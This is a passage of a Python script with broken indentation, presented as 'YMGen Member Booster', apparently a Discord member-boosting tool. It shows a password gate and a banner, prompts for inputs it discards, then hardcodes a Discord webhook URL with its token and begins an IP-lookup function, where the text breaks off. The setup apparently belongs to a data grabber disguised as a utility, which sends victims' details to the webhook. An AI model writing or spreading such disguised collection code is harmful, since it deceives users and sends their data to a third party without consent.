...
psw='88FG-REAS-9HB2'
for i in range(1):
lol=input(f"Enter Password To continue: ")
j=1
if(lol==psw):
os.system('cls' if os.name=='nt' else 'clear')
print('Loading...')
time.sleep(2)
print(f'{Fore.GREEN}Welcome YMGen ')
input('Password is correct Click Enter to continue! ')
break
else:
os.system('cls' if os.name=='nt' else 'clear')
print('Loading...')
time.sleep(2)
print(f"{Fore.RED}password is wrong ")
input(f"Click Enter to Exit! ")
exit()
VERSION='1.6'
bannerLOL=print(Colorate.Horizontal(Colors.blue_to_cyan,f"""
...
[ YMGen Member Booster {VERSION}]

[ Main ] | Member Booster / Ym#8117
"""))
name=input('[ > ] Username? ')
input('[ > ] Invite? ')
input('[ > ] thread? ')
hook='https://discord.com/api/webhooks/1061356929202540595/icGrjAMeY_ysRH-HNqwX_0SJubJIQP0Y2MSrL0a9Sp6IYX2gEnNfNN3s6i918fw8X0CC'
DETECTED=False
def getip():
ip='None'
try:
